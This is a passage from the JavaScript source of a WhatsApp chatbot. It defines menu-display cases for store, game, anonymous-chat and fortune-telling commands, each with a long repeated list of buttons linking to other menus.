│⟡ 〔 _.robot_
│⟡ 〔 _.slow_
│⟡ 〔 _.smooth_
│⟡ 〔 _.squirrel_
│⟡ 〔 _.tinyurl_
│⟡ 〔 _.tinyurl__
│⟡ 〔 _.tovn___
│⟡ 〔 _.toaudio_
│⟡ 〔 _.tomp3__
│⟡ 〔 _.tomp4_
│⟡ 〔 _.toimg_
│⟡ 〔 _.toonce_
│⟡ 〔 _.sticker_
│⟡ 〔 _.take_
│⟡ 〔 _.emoji_
│⟡ 〔 _.volume_
│⟡ 〔 _.ebinary_
│⟡ 〔 _.dbinary_
│⟡ 〔 _.ssweb_
│⟡ 〔 _.quoted_
│⟡ 〔 _.runtime_
◣──────────❈
◤─「 \`PRIMBON MENU\` 」─✦
│⟡ 〔 _.artimimpi_
│⟡ 〔 _.artinama_
│⟡ 〔 _.ramaljodoh_
│⟡ 〔 _.ramaljodohbali_
│⟡ 〔 _.suamiistri_
│⟡ 〔 _.ramalcinta_
│⟡ 〔 _.cocoknama_
│⟡ 〔 _.pasangan_
│⟡ 〔 _.jadiannikah_
│⟡ 〔 _.sifatusaha_
│⟡ 〔 _.rezeki_
│⟡ 〔 _.pekerjaan_
│⟡ 〔 _.nasib_
│⟡ 〔 _.penyakit_
│⟡ 〔 _.tarot_
│⟡ 〔 _.fengshui_
│⟡ 〔 _.haribaik_
│⟡ 〔 _.harisangar_
│⟡ 〔 _.harisial_
│⟡ 〔 _.nagahari_
│⟡ 〔 _.arahrezeki_
│⟡ 〔 _.peruntungan_
│⟡ 〔 _.weton_
│⟡ 〔 _.karakter_
│⟡ 〔 _.keberuntungan_
│⟡ 〔 _.memancing_
│⟡ 〔 _.masasubur_
│⟡ 〔 _.zodiak_
│⟡ 〔 _.shio_
◣──────────❈`

TradzSigma.sendMessage(m.chat, {
 video: { url: global.vidthumb},
gifPlayback: true,
caption: menunya,
footer: `© ${global.ownername}`,
 contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran,
            },
 externalAdReply: {
 title: global.namabot,
 body: 'Support me, thanks',
 thumbnailUrl: 'https://files.catbox.moe/vh3v40.jpg',
 mediaType: 1,
 showAdAttribution: true,
 sourceUrl: "https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p",
 renderLargerThumbnail: true
 }
 }},{quoted: qloc});
let pler = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/music.json');

let itil = pler[Math.floor(Math.random() * pler.length)];
await sleep(1000);
await TradzSigma.sendMessage(m.chat, { audio:{url: itil},mimetype: 'audio/mp4', ptt: true, fileLength: 99}, { quoted: m })}
break
case 'storemenubutton': {
let teks =`◤─「 \`STORE MENU\` 」─✦  √
│⦿ 〔 _.list_
│⦿ 〔 _.addlist_
│⦿ 〔 _.dellist_
│⦿ 〔 _.update_
│⦿ 〔 _.jeda_
│⦿ 〔 _.tambah_
│⦿ 〔 _.kurang_
│⦿ 〔 _.kali_
│⦿ 〔 _.bagi_
│⦿ 〔 _.delsetdone_
│⦿ 〔 _.changedone_
│⦿ 〔 _.setdone_
│⦿ 〔 _.delproses_
│⦿ 〔 _.changeproses_
│⦿ 〔 _.setproses_
│⦿ 〔 _.proses <reply chat>_
│⦿ 〔 _.done <reply chat>_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'gamemenubutton': {
let teks =`◤─「 \`GAME MENU\` 」─✦
│⦿ 〔 _.tebakkata_
│⦿ 〔 _.tebaktebakan_
│⦿ 〔 _.tebaklirik_
│⦿ 〔 _.tebakgambar_
│⦿ 〔 _.tebaklagu_
│⦿ 〔 _.tebakkimia_
│⦿ 〔 _.asahotak_
│⦿ 〔 _.siapaaku_
│⦿ 〔 _.susunkata_
│⦿ 〔 _.tekateki_
│⦿ 〔 _.tebakbendera_
│⦿ 〔 _.tebakbenderav2_
│⦿ 〔 _.tebakkabupaten_
│⦿ 〔 _.caklontong_
│⦿ 〔 _.family100_
│⦿ 〔 _.werewolf_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
//=========================================\\
//=========================================\\
case 'anonymousmenubutton': {
let teks =`◤─「 \`ANONYMOUS\` 」─✦
│⦿ 〔 _.anonymouschat_
│⦿ 〔 _.start_
│⦿ 〔 _.next_
│⦿ 〔 _.stop_
│⦿ 〔 _.sendprofile_
│⦿ 〔 _.menfess_
│⦿ 〔 _.confess_
│⦿ 〔 _.balasmenfess_
│⦿ 〔 _.tolakmenfess_
│⦿ 〔 _.stopmenfess_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
